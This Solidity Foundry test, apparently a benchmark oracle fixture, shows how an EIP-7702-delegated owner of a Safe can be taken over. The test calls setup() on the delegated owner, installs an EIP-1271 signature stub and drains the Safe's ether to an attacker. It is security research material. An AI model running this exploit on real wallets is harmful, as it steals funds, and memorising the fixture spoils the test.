// Found by the live agent run (run-ds-abl), kept as an oracle fixture. A lab owner that is an EIP-7702
// account delegating to the Safe singleton has no Safe state, so anyone can call setup() on it and
// become its owner. The replay shows owner, threshold and handler writes at that lab EOA.
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

interface ISafe {
    function setup(address[] calldata owners, uint256 threshold, address to, bytes calldata data,
        address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver) external;
    function execTransaction(address to, uint256 value, bytes calldata data, uint8 operation,
        uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken,
        address payable refundReceiver, bytes calldata signatures) external payable returns (bool);
    function nonce() external view returns (uint256);
    function getTransactionHash(address to, uint256 value, bytes calldata data, uint8 operation,
        uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken,
        address refundReceiver, uint256 nonce) external view returns (bytes32);
}

contract Eip1271Stub {
    bytes4 constant MAGIC = 0x1626ba7e;
    address immutable signer;

    constructor(address s) { signer = s; }

    function isValidSignature(bytes32 hash, bytes memory sig) external view returns (bytes4) {
        if (sig.length != 65) return 0xffffffff;
        bytes32 r; bytes32 s; uint8 v;
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
        if (ecrecover(hash, v, r, s) == signer) return MAGIC;
        return 0xffffffff;
    }
}

contract DelegatedSetupTest is Test {
    address constant ANVIL = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address constant O1 = 0x1000000000000000000000000000000000000001;
    address constant O2 = 0x2000000000000000000000000000000000000002;
    uint256 constant ATTACKER_PK = 0xA11CE;

    ISafe safe;
    address attacker;

    function setUp() public {
        attacker = vm.addr(ATTACKER_PK);
        bytes memory singletonCode = vm.getCode("lib/safe-artifacts/Safe.json");
        bytes memory proxyCode = vm.getCode("lib/safe-artifacts/SafeProxy.json");
        address singleton;
        assembly { singleton := create(0, add(singletonCode, 32), mload(singletonCode)) }
        bytes memory code = abi.encodePacked(proxyCode, abi.encode(singleton));
        address proxy;
        assembly { proxy := create(0, add(code, 32), mload(code)) }
        safe = ISafe(proxy);
        address[] memory owners = new address[](3);
        owners[0] = ANVIL; owners[1] = O1; owners[2] = O2;
        safe.setup(owners, 1, address(0), "", address(0), address(0), 0, payable(address(0)));
        vm.etch(O2, abi.encodePacked(hex"ef0100", singleton));
        vm.deal(address(safe), 10 ether);
    }

    function test_trace() public {
        emit log_named_uint("O2 code len", O2.code.length);

        (bool okA, bytes memory rA) = O2.staticcall(abi.encodeWithSignature("getThreshold()"));
        emit log_named_string("A ok", okA ? "yes" : "no");
        emit log_named_bytes("A ret", rA);

        Eip1271Stub handler = new Eip1271Stub(attacker);
        address[] memory meOnly = new address[](1);
        meOnly[0] = attacker;
        (bool okB, bytes memory rB) = O2.call(abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            meOnly, uint256(1), address(0), bytes(""), address(handler), address(0), uint256(0), address(0)));
        emit log_named_string("B setup ok", okB ? "yes" : "no");
        emit log_named_bytes("B ret", rB);

        bytes32 h = safe.getTransactionHash(attacker, 10 ether, "", 0, 0, 0, 0, address(0), address(0), safe.nonce());
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ATTACKER_PK, h);
        (bool okC, bytes memory rC) = O2.staticcall(abi.encodeWithSignature("isValidSignature(bytes32,bytes)", h, abi.encodePacked(r, s, v)));
        emit log_named_string("C 1271 ok", okC ? "yes" : "no");
        emit log_named_bytes("C ret", rC);

        bytes memory sigs = abi.encodePacked(
            bytes32(uint256(uint160(O2))), uint256(0x41), uint8(0), uint256(65), abi.encodePacked(r, s, v));
        vm.prank(attacker);
        (bool okD, bytes memory rD) = address(safe).call(abi.encodeWithSignature(
            "execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)",
            attacker, uint256(10 ether), bytes(""), uint8(0), uint256(0), uint256(0), uint256(0), address(0), address(0), sigs));
        emit log_named_string("D exec ok", okD ? "yes" : "no");
        emit log_named_bytes("D ret", rD);
        emit log_named_uint("safe bal", address(safe).balance);
        emit log_named_uint("attacker bal", attacker.balance);
    }
}
